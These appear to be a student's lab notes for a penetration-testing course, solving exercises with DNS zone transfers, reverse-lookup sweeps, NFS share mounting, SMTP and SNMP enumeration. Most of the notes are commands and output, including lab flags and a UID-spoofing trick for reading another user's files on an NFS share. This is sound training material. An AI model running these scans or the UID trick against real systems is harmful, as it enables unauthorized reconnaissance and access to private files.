
###### 7.1.7.4
Now that you have proven your DNS prowess, let's see you put it to work on a real unknown network. The first step is to identify the lab's DNS server.  
The network on VM Group 1 is private and the domain name is currently unknown; however, you do know the lab's IP range, and that is plenty of information for this problem.  
Take an active approach to scan this IP range identify the host(s) listening on the DNS port, and then query those servers to find the true DNS server for the public domain.  
Then, identify the full domain name of the main DNS server. The flag is in a TXT record with the same name as the full domain name.

Scan for open 53 ports:
```bash
nmap -p 53 192.168.222.0/24 | grep open -B5
```

Get x.x.x.149 & x.x.x.254

Resolve domain name:
```bash
host 192.168.196.149 192.168.222.149  
	149.222.168.192.in-addr.arpa domain name pointer dc.MAILMAN.com.
```

```bash
host -l mailman.com 192.168.222.149  
  
Using domain server:  
Name: 192.168.222.149  
Address: 192.168.222.149#53  
Aliases:   
  
mailman.com name server dc.mailman.com.  
_msdcs.mailman.com name server dc.mailman.com.  
dc.mailman.com has address 192.168.222.149  
DomainDnsZones.mailman.com has address 192.168.50.149  
DomainDnsZones.mailman.com has address 192.168.120.149  
ForestDnsZones.mailman.com has address 192.168.50.149  
ForestDnsZones.mailman.com has address 192.168.120.149
```

```bash
dnsrecon -d mailman.com -n 192.168.222.149 -t axfr  
  
[*] Checking for Zone Transfer for mailman.com name servers  
[*] Resolving SOA Record  
...
[*] Trying NS server 192.168.222.149  
[+] 192.168.222.149 Has port 53 TCP Open  
[+] Zone Transfer was successful!!  
[*]      NS dc.mailman.com 192.168.222.149  
[*]      NS dc.mailman.com 192.168.222.149  
[*]      TXT OS{7a3971bc48b15581ae6224ff830fa542}  
...
```


###### 7.1.7.5
Great! You have figured out where the main DNS server is located. Now,once started VM Group 2, use your active recon techniques to interrogate this server  
and learn more about the domain. In doing so, you will learn that the DNS host you found is also the name server for a special subdomain. Going further,  
you will then learn about a single very special host (an A record) within this special subdomain. What is the only host known about by the DNS server on this  
additional subdomain? The flag is in a TXT record with the same name as the full domain name of this host.

```bash
dnsrecon -d _msdcs.mailman.com -n 192.168.222.149 -t axfr  
[*] Checking for Zone Transfer for _msdcs.mailman.com name servers  
[*] Resolving SOA Record  
...  
[+] Zone Transfer was successful!!  
[*]      SOA dc.mailman.com 192.168.222.149  
[*]      NS dc.mailman.com 192.168.222.149  
[*]      TXT OS{d2c903f645c245ecdb985d4146023a16}
...
```


###### 7.1.7.6
You have recovered all the information you can about the target domain, but that might not be the only domain that the DNS server manages.  
Instead of approaching the recon from a domain name perspective, you should try approaching it from an IP perspective by doing a brute force  
search of the available IP range _192.168.x.0/24_ on VM Group 3.What new domain do you discover using this approach?

```bash
for ip in $(seq 0 255); do host -l 192.168.222.$ip 192.168.222.149; done | grep OS  
124.222.168.192.in-addr.arpa domain name pointer OS{5316b87f7eba818345990ed723821dce}.
```


###### 7.4.3.1&2
1. Use Nmap to make a list of machines running NFS in the labs.  
2. Use NSE scripts to scan these systems and collect additionalinformation about accessible shares.

```bash
nmap -v -p 111 10.11.1.* | grep -B 4 open | grep 10.11.1 | cut -d “ ” -f5 > nfsips.txt  
nmap -p --script=rpcinfo -iL nfsips.txt | tee rpcinfo.txt  
nmap -p --script=nfs* -iL nfsips.txt | tee nfsinfo.txt
```
	10.11.72
	nsf-showmount:
		/home 10.11.0.0/255.255.0.0 |


```bash
mkdir nfshome  
sudo mount -o nolock,vers=3 10.11.1.72:/home /home/kali/nfshome  
cd nfshome && ls -al
```
	total 28  
	drwxr-xr-x 7 root root 4096 Sep 17 2015 .  
	drwxr-xr-x 3 kali kali 4096 Oct 25 09:50 ..  
	drwxr-xr-x 2 1013 1013 4096 Sep 17 2015 jenny  
	drwxr-xr-x 2 1012 1012 4096 Sep 17 2015 joe45  
	drwxr-xr-x 2 1011 1011 4096 Sep 17 2015 john  
	drwxr-xr-x 2 1014 1014 4096 Oct 27 2019 marcus  
	drwxr-x--- 3 root 1010 4096 Jan 8 2015 ryuu  

  
```bash
cd marcus  
ls -la
```
	total 12  
	drwxr-xr-x 2 1014 1014 4096 Oct 27 2019 .  
	drwxr-xr-x 7 root root 4096 Sep 17 2015 ..  
	-rwx------ 1 1014 1014 48 Oct 27 2019 creds.txt  
 
  
```bash
sudo adduser pwn  
sudo sed -i -e ‘s/1001/1014/g’ /etc/passwd  
su pwn  
cat creds
```
	Not what you are looking for, try harder!!! :O)  


```bash
su kali  
sudo sed -i -e ‘s/1014/1010/g’ /etc/passwd  
su pwn  
cd ../ryuu  
ls -la
```
	total 32  
	drwxr-x--- 3 root 1010 4096 Jan 8 2015 .  
	drwxr-xr-x 7 root root 4096 Sep 17 2015 ..  
	-rw-r----- 1 root 1010 10 Jan 8 2015 .bash_login  
	-rw-r----- 1 root 1010 10 Jan 8 2015 .bash_logout  
	-rw-r----- 1 root 1010 10 Jan 8 2015 .bash_profile  
	-rw-r----- 1 root 1010 31 Jan 8 2015 .bashrc  
	-rw-r----- 1 root 1010 10 Jan 8 2015 .profile  
	drwxr-xr-x 3 root 1010 4096 Jan 8 2015 usr  


```bash
cd usr  
ls -la
```
	total 12  
	drwxr-xr-x 3 root 1010 4096 Jan 8 2015 .  
	drwxr-x--- 3 root 1010 4096 Jan 8 2015 ..  
	drwxr-x--- 2 root 1010 4096 Jan 8 2015 bin  


```bash
cd bin  
ls -la
```
	total 8  
	drwxr-x--- 2 root 1010 4096 Jan 8 2015 .  
	drwxr-xr-x 3 root 1010 4096 Jan 8 2015 ..  


```bash
cat .bash_login  
cat .bash_logout  
cat .bash_profile  
cat .profile  
```
	all return:  
	. .bashrc  


```bash
cat .bashrc
```
	export PATH=/home/ryuu/usr/bin



###### 7.5.1.1&2
1. Search your target network range to see if you can identify any systems that respond to the SMTP _VRFY_ command.  
2. Try using this Python code to automate the process of username discovery using a text file with usernames as input.  

```bash
ls -l /usr/share/nmap/scripts/smtp*
```
	-rw-r--r-- 1 root root 4309 Jan 18 2022 /usr/share/nmap/scripts/smtp-brute.nse  
	-rw-r--r-- 1 root root 4957 Jan 18 2022 /usr/share/nmap/scripts/smtp-commands.nse  
	-rw-r--r-- 1 root root 12006 Jan 18 2022 /usr/share/nmap/scripts/smtp-enum-users.nse  
	-rw-r--r-- 1 root root 5873 Jan 18 2022 /usr/share/nmap/scripts/smtp-ntlm-info.nse  
	-rw-r--r-- 1 root root 10148 Jan 18 2022 /usr/share/nmap/scripts/smtp-open-relay.nse  
	-rw-r--r-- 1 root root 716 Jan 18 2022 /usr/share/nmap/scripts/smtp-strangeport.nse  
	-rw-r--r-- 1 root root 14781 Jan 18 2022 /usr/share/nmap/scripts/smtp-vuln-cve2010-4344.nse  
	-rw-r--r-- 1 root root 7719 Jan 18 2022 /usr/share/nmap/scripts/smtp-vuln-cve2011-1720.nse  
	-rw-r--r-- 1 root root 7603 Jan 18 2022 /usr/share/nmap/scripts/smtp-vuln-cve2011-1764.nse  


```bash
nmap -sV -p 25 --script=smtp* 10.11.1.* --open | tee -a labtargets-smtp
```


###### 7.6.4.1&2
1. Scan your target network with onesixtyone to identify any SNMP servers.  
2. Use snmpwalk and snmp-check to gather information about the discovered targets.  


```bash
sudo nmap -sU -p 161 10.11.1.* --open | tee snmp  
grep 10.11.1 snmp > snmp-ips  
cat > snmp-community  
```
	public  
	private  
	manager


```bash
onesixtyone -c snmp-community -i snmp-ips
```
	Scanning 14 hosts, 4 communities  
	10.11.1.115 [public] Linux tophat.acme.com 2.4.20-8 #1 Thu Mar 13 17:54:28 EST 2003 i686  
	10.11.1.227 [public] Hardware: x86 Family 15 Model 1 Stepping 2 AT/AT COMPATIBLE - Software: Windows 2000 Version 5.0 (Build 2195 Uniprocessor Free)  


```bash
snmpwalk -c public -v1 10.11.1.115 | snmp-walk  
snmpwalk -c public -v1 10.11.1.227 >> snmp-walk
```
	10.11.1.115 kept timing out, so focused on .227  


```bash
snmpwalk -c public -v1 -t 10 10.11.1.227 1.3.6.1.4.1.77.1.2.25 | tee snmp-users  
snmpwalk -c public -v1 10.11.1.227 1.3.6.1.2.1.25.4.2.1.2 | tee snmp-procs  
snmpwalk -c public -v1 10.11.1.227 1.3.6.1.2.1.6.13.1.3 | tee snmp-ports
```


```bash
snmp-check 10.11.1.227 > snmp-chk
```